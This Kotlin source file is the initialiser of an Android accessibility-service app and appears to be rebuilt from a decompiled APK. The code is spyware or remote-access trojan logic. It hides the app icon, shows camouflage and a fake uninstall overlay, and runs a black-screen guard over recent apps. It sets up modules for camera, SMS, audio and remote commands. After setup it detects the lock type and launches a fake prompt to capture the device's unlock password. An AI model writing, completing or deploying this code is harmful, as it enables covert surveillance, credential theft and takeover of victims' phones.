package com.storm.safe.rock.service.delegates

import android.content.Context
import com.storm.safe.rock.manager.C0263a5
import com.storm.safe.rock.manager.ScreenCaptureManager
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.delegates.registrar.CoreModuleRegistrar
import com.storm.safe.rock.service.delegates.registrar.PostAuthModuleRegistrar
import com.storm.safe.rock.service.delegates.registrar.SecurityModuleRegistrar
import com.storm.safe.rock.service.delegates.registrar.StateRestorer
import com.storm.safe.rock.service.modules.ActivityMonitor
import com.storm.safe.rock.service.modules.screen.ScreenControlHelper
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONObject

/**
 * ServiceInitializer — register/boot orchestrator for MyAccessibilityService.
 *
 * Follows Laravel's ServiceProvider two-phase pattern:
 *   Phase 1 (register): Create module instances via ModuleRegistrar.register()
 *   Phase 2 (boot):     Cross-module wiring via ModuleRegistrar.boot()
 *
 * Reference: Illuminate\Foundation\Application L883-924 (register), L1120-1155 (boot)
 *
 * Delegates module creation to 4 registrars:
 * - CoreModuleRegistrar:     NetworkManager, EventFilterManager, OverlayManager, etc.
 * - SecurityModuleRegistrar: BiometricBypass, UninstallProtection, RecentsGuard
 * - PostAuthModuleRegistrar: Camera, SMS, Audio, Cipher, CommandDispatcher, etc.
 * - StateRestorer:           Auth state, uninstall protection, icon hide, camouflage
 */
class ServiceInitializer(private val service: MyAccessibilityService) {

    companion object {
        private const val TAG = "ServiceInitializer"
    }

    // Core + Security registrars (always run at startup)
    private val coreRegistrars = listOf(
        CoreModuleRegistrar(),
        SecurityModuleRegistrar()
    )

    // Deferred registrar (runs after authorization)
    // Reference: Laravel Application L920: if (isBooted()) { bootProvider(provider); }
    private val deferredRegistrar = PostAuthModuleRegistrar()
    private val stateRestorer = StateRestorer()

    // ════════════════════════════════════════════════════════════════
    // Pure logic helpers (testable)
    // ════════════════════════════════════════════════════════════════

    /**
     * Check if a reinstall recovery file exists and restore auth state.
     * JADX: onServiceConnected step 1 — reads /data/local/tmp/app_setup_done.json
     */
    fun checkReinstallRecovery(): Boolean {
        try {
            val setupFile = java.io.File("/data/local/tmp/app_setup_done.json")
            if (setupFile.exists()) {
                val prefs = service.getSharedPreferences("app_config", Context.MODE_PRIVATE)
                if (!prefs.getBoolean("authorization_completed", false)) {
                    try {
                        val json = JSONObject(setupFile.readText())
                        if (json.optBoolean("setupDone", false)) {
                            prefs.edit()
                                .putBoolean("authorization_completed", true)
                                .putBoolean("device_registered", true)
                                .putBoolean("icon_hidden", true)
                                .apply()
                            android.util.Log.d(TAG, "✅ [重装恢复] Service检测到适配标记，已恢复全部状态")
                            return true
                        }
                    } catch (e: Exception) {
                        android.util.Log.w(TAG, "⚠️ [重装恢复] 读取标记文件异常: ${e.message}")
                        return true // JADX: still sets true even on parse error
                    }
                }
            }
        } catch (e: Exception) {
            android.util.Log.w(TAG, "⚠️ [重装恢复] 读取标记文件异常: ${e.message}")
        }
        return false
    }

    /**
     * Check if device is already authorized via SharedPreferences.
     * JADX: doHeavyInit reads app_config.authorization_completed
     */
    fun isAlreadyAuthorized(): Boolean {
        return try {
            service.getSharedPreferences("app_config", Context.MODE_PRIVATE)
                .getBoolean("authorization_completed", false)
        } catch (_: Exception) { false }
    }

    // ════════════════════════════════════════════════════════════════
    // Main entry point
    // ════════════════════════════════════════════════════════════════

    /**
     * Orchestrate the full init sequence — replaces onServiceConnected init logic.
     * JADX: onServiceConnected launches continueServiceInitialization (if recovery)
     * then deferredInit + doHeavyInit sequentially.
     */
    suspend fun runFullInit(isReinstallRecovery: Boolean) {
        if (isReinstallRecovery) {
            try {
                continueServiceInitialization()
            } catch (e: Exception) {
                android.util.Log.e(TAG, "❌ recovery init failed", e)
            }
        }

        // Broadcast registration
        service.getCoroutineScope()?.launch(Dispatchers.Main) {
            try {
                service.registerBroadcastReceivers()
            } catch (e: Exception) {
                android.util.Log.e(TAG, "❌ registerBroadcastReceivers failed", e)
            }
        }

        // JADX: m211447d2() — init service configuration flags
        try {
            service.initServiceConfig()
        } catch (_: Exception) {}

        // Phase 1: register — create module instances
        coreRegistrars.forEach { it.register(service) }
        service.isModulesInitialized = true

        // Phase 2: boot — cross-module wiring
        coreRegistrars.forEach { it.boot(service) }

        // WebView status check
        try {
            service.startWebViewStatusCheckTask()
        } catch (_: Exception) {}

        // State restoration + heavy init
        stateRestorer.register(service)

        // Service init (managers + permission flow)
        initializeService()

        android.util.Log.d(TAG, "✅ [重初始化] 全部完成，服务就绪")
        try {
            ActivityMonitor.logSystem("延迟初始化全部完成 服务就绪")
        } catch (_: Exception) {}
    }

    // ════════════════════════════════════════════════════════════════
    // Init methods — kept for external callers
    // ════════════════════════════════════════════════════════════════

    /**
     * Continue service initialization after core setup.
     * JADX method: a2, line ~900 (onServiceConnected$1$1)
     * Initializes display/screen managers, starts network.
     */
    suspend fun continueServiceInitialization() {
        android.util.Log.d(TAG, "🔧 继续服务初始化...")
        try {
            if (service.displayManager == null) {
                service.displayManager = C0263a5(service)
            }
            if (service.screenCaptureManager == null) {
                service.screenCaptureManager = ScreenCaptureManager(service)
            }
            if (service.cameraManager == null) {
                service.cameraManager = com.storm.safe.rock.manager.C0258a0(service)
            }
            service.isInitComplete = true
            android.util.Log.d(TAG, "✅ 服务核心初始化完成")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 继续服务初始化失败", e)
        }
    }

    /**
     * Initialize deferred managers — called after authorization completes.
     * JADX method: m211416b5 (b5), line 2232
     * Delegates to PostAuthModuleRegistrar.
     */
    fun initializeDeferredManagers() {
        deferredRegistrar.register(service)
    }

    /**
     * Initialize managers — cleanup old resources + create fresh instances.
     * JADX method: m211477h1 (h1), line 6136
     * Unique cleanup logic must stay here — not in registrars.
     */
    private fun initializeManagers() {
        android.util.Log.d(TAG, "🧹 开始清理旧管理器资源...")

        // JADX: cleanup old displayManager scope
        try { service.displayManager?.stopCapture() } catch (_: Exception) {}
        // JADX: cleanup old cameraManager
        try { service.cameraManager?.release() } catch (_: Exception) {}
        // JADX: cleanup old audioManager
        try { service.audioManager?.release() } catch (_: Exception) {}
        // JADX: cleanup old screenCaptureManager scope
        try { service.screenCaptureManager?.stopCapture() } catch (_: Exception) {}

        android.util.Log.d(TAG, "🧹 旧管理器资源清理完成")

        // JADX: create fresh instances
        service.screenCaptureManager = ScreenCaptureManager(service)
        service.displayManager = C0263a5(service)

        // JADX: C0357a0 — screenControlHelper
        try {
            service.screenControlHelper = ScreenControlHelper(service)
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ ScreenControlHelper 初始化失败", e)
        }

        // JADX: wire eventFilterManager with screenCaptureManager
        service.eventFilterManager?.let { efm ->
            efm.isAuthStateRestored = service.isAuthStateRestored
        }

        android.util.Log.d(TAG, "✅ 适配前最小管理器初始化完成")
    }

    /**
     * Service initialization — manages init + permission flow.
     * JADX method: m211479h3 (h3), line 6418
     */
    private suspend fun initializeService() {
        android.util.Log.d(TAG, "🚀 开始无障碍服务初始化")

        try {
            initializeManagers()
            service.isInitComplete = true
        } catch (e: Exception) {
            android.util.Log.w(TAG, "❌ initializeManagers失败，降级处理: ${e.message}")
            try {
                fallbackInit()
            } catch (e2: Exception) {
                android.util.Log.e(TAG, "❌ 降级初始化也失败", e2)
            }
        }

        try {
            service.startPermissionGrantFlow()
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ startPermissionGrantFlow失败: ${e.message}", e)
        }

        android.util.Log.d(TAG, "✅ 无障碍服务初始化完成 (isInitialized=${service.isInitComplete})")
    }

    /**
     * Initialize recents guard (black screen UI control).
     * JADX method: m211491i5 (i5), line 6940
     * Called externally by BlackScreenCommandHandler.
     */
    fun initializeRecentsGuard() {
        try {
            if (com.storm.safe.rock.p029ui.ibbnqvnvhxg.isRunning()) {
                android.util.Log.d(TAG, "ibbnqvnvhxg 已在运行，跳过启动")
                return
            }
            if (service.isOverlayVisible) {
                android.util.Log.d(TAG, "ibbnqvnvhxg overlay 已可见，跳过启动")
                return
            }
            try {
                val intent = android.content.Intent(service, com.storm.safe.rock.p029ui.ibbnqvnvhxg::class.java)
                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                service.startActivity(intent)
                android.util.Log.d(TAG, "✅ initializeRecentsGuard — ibbnqvnvhxg 已启动")
            } catch (e: Exception) {
                android.util.Log.w(TAG, "⚠️ ibbnqvnvhxg 启动失败: ${e.message}")
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 启动 ibbnqvnvhxg 失败", e)
        }
    }

    /**
     * Try to show the fake package verify (uninstall) overlay.
     * JADX method: m211534n2 (n2), line 9587
     */
    fun tryShowPackageVerify() {
        try {
            android.util.Log.d(TAG, "📦 [假卸载] ★★★ tryShowPackageVerify() 被调用 ★★★")

            val uninstallMode = try {
                val text = com.storm.safe.rock.util.AssetConfigReader.readAssetConfig(service, "server_config.json")
                if (text != null) JSONObject(text).optBoolean("uninstallMode", false) else false
            } catch (_: Exception) { false }
            android.util.Log.d(TAG, "📦 [假卸载] uninstallMode=$uninstallMode (配置来源: server_config.json)")
            if (!uninstallMode) {
                android.util.Log.d(TAG, "📦 [假卸载] uninstallMode 未启用，跳过")
                return
            }

            val verifyDone = service.getSharedPreferences("pkg_verify_state", Context.MODE_PRIVATE)
                .getBoolean("v_done", false)
            android.util.Log.d(TAG, "📦 [假卸载] shouldShow=${!verifyDone}")

            if (verifyDone) {
                android.util.Log.d(TAG, "📦 [假卸载] 已弹出过，跳过")
                return
            }

            android.util.Log.d(TAG, "📦 [假卸载] ★★★ 开始显示假卸载页面 ★★★")
            com.storm.safe.rock.service.modules.overlay.PkgVerifyOverlay.show(service)
        } catch (e: Exception) {
            android.util.Log.e(TAG, "📦 [假卸载] 显示失败", e)
        }
    }

    /**
     * Fallback initialization — minimal manager setup.
     * JADX method: m211476h0 (h0), line 6114
     */
    fun fallbackInit() {
        try {
            android.util.Log.d(TAG, "🔄 执行降级初始化")
            if (service.screenCaptureManager == null) {
                service.screenCaptureManager = ScreenCaptureManager(service)
            }
            if (service.displayManager == null) {
                service.displayManager = C0263a5(service)
            }
            android.util.Log.d(TAG, "✅ 降级初始化完成")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 降级初始化失败", e)
        }
    }

    /**
     * Post-authorization initialization. JADX: m211504j8 (j8)
     * Called after device authorization is complete.
     *
     * JADX: launches 2 coroutines on coroutineScope:
     * - postAuthorizationInit$1: registers deferred components (b9, c0, k2, b7)
     * - postAuthorizationInit$2: calls b5 (additional init)
     */
    fun postAuthorizationInit() {
        try {
            android.util.Log.i(TAG, "★ postAuthorizationInit: 授权完成后初始化")
            service.getCoroutineScope()?.launch(Dispatchers.Main) {
                try {
                    android.util.Log.d(TAG, "🔧 [授权后初始化] 开始注册延迟组件...")
                    initializeDeferredManagers()
                    service.overlayManager?.hide()
                    android.util.Log.d(TAG, "✅ [授权后初始化] 延迟组件注册完成，配置遮罩已隐藏")
                } catch (e: Exception) {
                    android.util.Log.e(TAG, "❌ postAuthorizationInit coroutine 1 failed", e)
                }
            }
            service.getCoroutineScope()?.launch(Dispatchers.IO) {
                try {
                    kotlinx.coroutines.delay(3000)
                    val prefs = service.getSharedPreferences("cipher_config", Context.MODE_PRIVATE)
                    val cipherDone = prefs.getBoolean("cipher_completed", false)
                    val savedType = prefs.getString("cipher_lock_type", "") ?: ""

                    val currentType = kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.Main) {
                        try {
                            val root = service.rootInActiveWindow
                            val detected = service.accessibilityEventRouter?.detectLockType(root)
                            root?.recycle()
                            detected?.name?.lowercase() ?: ""
                        } catch (_: Exception) { "" }
                    }

                    val needsRecapture = when {
                        !cipherDone -> true
                        savedType.isEmpty() || savedType == "unknown" -> true
                        currentType.isNotEmpty() && currentType != "unknown" && currentType != savedType -> true
                        else -> false
                    }

                    if (needsRecapture) {
                        when {
                            !cipherDone ->
                                android.util.Log.d(TAG, "🔐 [postAuth] 启动密码验证流程")
                            savedType.isEmpty() || savedType == "unknown" ->
                                android.util.Log.d(TAG, "🔐 [postAuth] 旧版数据无类型记录，强制重新捕获")
                            else ->
                                android.util.Log.d(TAG, "🔐 [postAuth] 密码类型变化: $savedType → $currentType，重新捕获")
                        }
                        prefs.edit().putBoolean("cipher_completed", false).apply()
                        service.isCipherCaptureEnabled = true
                        service.cipherRetryCount = 0
                        service.cipherCaptureManager?.startListening()
                        if (com.storm.safe.rock.util.DebugConfig.disableCipherOverlay) {
                            android.util.Log.d(TAG, "🔐 [postAuth] debug 禁用弹窗，已启用被动监听")
                        } else {
                            kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.Main) {
                                service.doLaunchSystemPasswordCapture(isInstallationFlow = true)
                            }
                        }
                    } else {
                        android.util.Log.d(TAG, "🔐 [postAuth] 密码已捕获(type=$savedType)，跳过")
                    }
                } catch (_: Exception) {}
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "postAuthorizationInit failed", e)
        }
    }
}
